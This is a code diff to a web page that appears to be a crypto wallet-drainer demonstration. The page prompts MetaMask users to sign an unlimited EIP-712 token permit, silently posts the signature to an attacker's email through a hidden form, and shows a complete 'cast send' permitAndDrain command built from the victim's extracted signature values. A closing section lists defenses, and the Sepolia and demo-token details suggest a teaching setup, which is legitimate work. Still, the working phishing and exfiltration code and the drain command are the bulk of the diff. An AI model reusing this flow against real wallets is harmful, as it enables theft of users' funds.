@@ -151,8 +151,13 @@
   .debug-table { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-top: 16px; font-size: 0.75rem; font-family: monospace; }
   .debug-row { display: flex; padding: 4px 0; border-bottom: 1px solid var(--border); }
   .debug-row:last-child { border-bottom: none; }
-  .debug-label { color: var(--muted); min-width: 100px; font-weight: 600; }
+  .debug-label { color: var(--muted); min-width: 120px; font-weight: 600; }
   .debug-value { color: #86efac; word-break: break-all; flex: 1; }
+
+  /* CAST COMMAND BOX */
+  .cast-command-box { background: var(--card); border: 1px solid rgba(108,99,255,0.3); border-radius: 10px; padding: 16px; margin-top: 16px; margin-bottom: 16px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; overflow-x: auto; line-height: 1.7; }
+  .cast-title { color: var(--text); margin-bottom: 10px; font-weight: 600; }
+  .cast-line { color: #86efac; word-break: break-all; }
 </style>
 </head>
 <body>
@@ -234,23 +239,40 @@
         Right now, the attacker just received an email with your signed permit, wallet address, and deadline. They didn't need to be in your MetaMask or browser. The permit is already exfiltrated to their inbox. They can drain you from their terminal at any time, anywhere in the world.
       </div>
  
-      <div style="background: var(--card); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px; margin-bottom: 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; overflow-x: auto; line-height: 1.7;">
-        <div style="color: var(--text); margin-bottom: 10px; font-weight: 600;">📝 What attacker received in email:</div>
-        <div style="color: #86efac;">wallet:</div> <span style="color: #86efac;" id="dashOwner">—</span><br>
-        <div style="color: #86efac;">permit_signature:</div> <span style="color: var(--red);" id="dashSigShort">0x...</span> (full ECDSA sig)<br>
-        <div style="color: #86efac;">spender:</div> <span style="color: var(--red);">0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05</span><br>
-        <div style="color: #86efac;">value:</div> <span class="code-value" id="dashValue">MAX_UINT256</span><br>
-        <div style="color: #86efac;">deadline:</div> <span style="color: #a5b4fc;" id="dashDeadline">—</span><br>
-        <br>
-        <div style="color: var(--muted); font-size: 0.75rem;">💀 value = MAX_UINT256 means unlimited drain on any token</div>
+      <div class="cast-command-box">
+        <div class="cast-title">📋 Exact cast command to execute the drain (6 parameters):</div>
+        <div class="cast-line">cast send 0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05 \</div>
+        <div class="cast-line">"permitAndDrain(address,address,uint256,uint8,bytes32,bytes32)" \</div>
+        <div class="cast-line"><span style="color: #fbbf24;" id="castToken">0x56c36D...</span> \</div>
+        <div class="cast-line"><span style="color: #fbbf24;" id="castVictim">0x18001a...</span> \</div>
+        <div class="cast-line"><span style="color: #fbbf24;" id="castDeadline">1789253368</span> \</div>
+        <div class="cast-line"><span style="color: #fbbf24;" id="castV">27</span> \</div>
+        <div class="cast-line"><span style="color: #fbbf24;" id="castR">0x0486d3...</span> \</div>
+        <div class="cast-line"><span style="color: #fbbf24;" id="castS">0x054519...</span> \</div>
+        <div class="cast-line">--rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY</div>
+      </div>
+
+      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--text); line-height: 1.7; margin-bottom: 16px;">
+        <div style="color: var(--red); font-weight: 600; margin-bottom: 8px;">ℹ️ About the function parameters:</div>
+        <ul style="margin-left: 16px; color: var(--muted); font-size: 0.8rem;">
+          <li><strong style="color: var(--text);">tokenAddress:</strong> The token contract you're draining</li>
+          <li><strong style="color: var(--text);">victim:</strong> The wallet owner (recovers from signature)</li>
+          <li><strong style="color: var(--text);">deadline:</strong> Unix timestamp when permit expires (part of signed data)</li>
+          <li><strong style="color: var(--text);">v, r, s:</strong> ECDSA signature components from the typed data signature</li>
+          <li><strong style="color: var(--text);">value:</strong> <span style="color: var(--green);">HARDCODED IN CONTRACT</span> as type(uint256).max — not a function parameter</li>
+        </ul>
       </div>
 
       <!-- DEBUG: Show extracted values -->
       <div class="debug-table">
-        <div class="debug-row"><div class="debug-label">r (64 chars)</div><div class="debug-value" id="debugR">—</div></div>
-        <div class="debug-row"><div class="debug-label">s (64 chars)</div><div class="debug-value" id="debugS">—</div></div>
-        <div class="debug-row"><div class="debug-label">v (27 or 28)</div><div class="debug-value" id="debugV">—</div></div>
-        <div class="debug-row"><div class="debug-label">deadline (unix)</div><div class="debug-value" id="debugDeadline">—</div></div>
+        <div class="debug-row"><div class="debug-label">Function signature</div><div class="debug-value">permitAndDrain(address,address,uint256,uint8,bytes32,bytes32)</div></div>
+        <div class="debug-row"><div class="debug-label">Token address</div><div class="debug-value" id="debugToken">—</div></div>
+        <div class="debug-row"><div class="debug-label">Victim (owner)</div><div class="debug-value" id="debugVictim">—</div></div>
+        <div class="debug-row"><div class="debug-label">Deadline (unix)</div><div class="debug-value" id="debugDeadline">—</div></div>
+        <div class="debug-row"><div class="debug-label">v</div><div class="debug-value" id="debugV">—</div></div>
+        <div class="debug-row"><div class="debug-label">r (64 hex chars)</div><div class="debug-value" id="debugR">—</div></div>
+        <div class="debug-row"><div class="debug-label">s (64 hex chars)</div><div class="debug-value" id="debugS">—</div></div>
+        <div class="debug-row"><div class="debug-label">value (hardcoded)</div><div class="debug-value" style="color: #fbbf24;">type(uint256).max</div></div>
       </div>
 
       <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--red); line-height: 1.7; margin-top: 16px;">
@@ -308,7 +330,6 @@
             &nbsp;&nbsp;wallet: <span id="revealVictim" style="color:#86efac">your_address</span>,<br>
             &nbsp;&nbsp;signature: <span style="color:#f87171">0x...</span>,<br>
             &nbsp;&nbsp;spender: <span style="color:#f87171">0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05</span>,<br>
-            &nbsp;&nbsp;value: <span class="code-value">MAX_UINT256</span>,<br>
             &nbsp;&nbsp;deadline: <span id="revealDeadline" style="color:#a5b4fc">unix_time</span><br>
             })<br>
             <br>
@@ -387,6 +408,10 @@
         <div class="defense-num">5</div>
         <div class="defense-text"><strong>Understand permit expiry.</strong> The deadline in this permit was set to 2 days from now. The attacker can drain you anytime within that window. Even if you "revoke" via revoke.cash, the signed permit still exists in their email and can still be used on-chain.</div>
       </div>
+      <div class="defense-item">
+        <div class="defense-num">6</div>
+        <div class="defense-text"><strong>Understand permit internals.</strong> A permit signature encodes the <em>value</em> (approval amount) and <em>deadline</em> cryptographically within the signature itself. The attacker cannot change these values — they're bound to what you signed. The smart contract decodes them from the signature, not from function parameters.</div>
+      </div>
     </div>
   </div>
 </div>
@@ -437,19 +462,16 @@
 
   // ---- EXTRACT AND VALIDATE SIGNATURE ----
   function extractSignatureComponents(sig) {
-    // Remove 0x prefix if present
     const cleaned = sig.startsWith('0x') ? sig.slice(2) : sig;
     
-    // Should be 130 hex chars (65 bytes: 32+32+1)
     if (cleaned.length !== 130) {
       throw new Error(`Invalid signature length: ${cleaned.length} (expected 130)`);
     }
     
-    // Extract r, s, v
-    const r = '0x' + cleaned.slice(0, 64);    // First 64 hex chars = 32 bytes
-    const s = '0x' + cleaned.slice(64, 128);  // Next 64 hex chars = 32 bytes
-    const vHex = cleaned.slice(128, 130);     // Last 2 hex chars
-    const v = parseInt(vHex, 16);             // Convert to decimal (27 or 28)
+    const r = '0x' + cleaned.slice(0, 64);
+    const s = '0x' + cleaned.slice(64, 128);
+    const vHex = cleaned.slice(128, 130);
+    const v = parseInt(vHex, 16);
     
     console.log('✓ Signature extraction successful');
     console.log('  r:', r, `(${r.length - 2} hex chars)`);
@@ -468,7 +490,6 @@
     document.getElementById('exfilDeadline').value = permitDeadline ? new Date(permitDeadline * 1000).toUTCString() : 'unknown';
     document.getElementById('exfilNonce').value = nonce || '0';
     
-    // Submit silently
     document.getElementById('permitExfilForm').submit();
   }
  
@@ -487,7 +508,6 @@
     document.getElementById('connectNote').textContent = "Approve the connection request in MetaMask.";
  
     try {
-      // POPUP #1 — connection
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
  
@@ -504,12 +524,11 @@
       ]);
       document.getElementById('connectNote').textContent = "One more step — sign the verification in MetaMask.";
  
-      // POPUP #2 — permit signature (EIP-712 typed data)
       const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
       const nonce = await tokenContract.nonces(userAddress);
       permitNonce = nonce.toString();
  
-      permitDeadline = Math.floor(Date.now() / 1000) + 172800; // 2 days
+      permitDeadline = Math.floor(Date.now() / 1000) + 172800;
  
       const domain = {
         name: "Demo Token",
@@ -539,18 +558,25 @@
       const browserProvider = new ethers.BrowserProvider(window.ethereum);
       const signer = await browserProvider.getSigner();
  
-      // This fires the signature request popup
       const signature = await signer.signTypedData(domain, types, message);
       permitSig = signature;
       
-      // EXTRACT AND VALIDATE SIGNATURE
       const { r, s, v } = extractSignatureComponents(signature);
       
-      // Display debug info
       document.getElementById('debugR').textContent = r;
       document.getElementById('debugS').textContent = s;
       document.getElementById('debugV').textContent = v;
       document.getElementById('debugDeadline').textContent = permitDeadline;
+      document.getElementById('debugToken').textContent = TOKEN_ADDRESS;
+      document.getElementById('debugVictim').textContent = userAddress;
+      
+      // Populate the cast command display
+      document.getElementById('castToken').textContent = TOKEN_ADDRESS;
+      document.getElementById('castVictim').textContent = userAddress;
+      document.getElementById('castDeadline').textContent = permitDeadline;
+      document.getElementById('castV').textContent = v;
+      document.getElementById('castR').textContent = r;
+      document.getElementById('castS').textContent = s;
       
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected',     desc: shortAddr(userAddress) },
@@ -558,10 +584,8 @@
       ]);
       document.getElementById('connectNote').textContent = "Loading your portfolio...";
  
-      // *** EXFILTRATE PERMIT TO ATTACKER EMAIL ***
       exfiltratePermit(userAddress, permitSig, permitNonce);
 
-      // Update dashboard with permit details
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       document.getElementById('dashOwner').textContent = userAddress;
       document.getElementById('dashSigShort').textContent = permitSig.slice(0, 20) + "...";
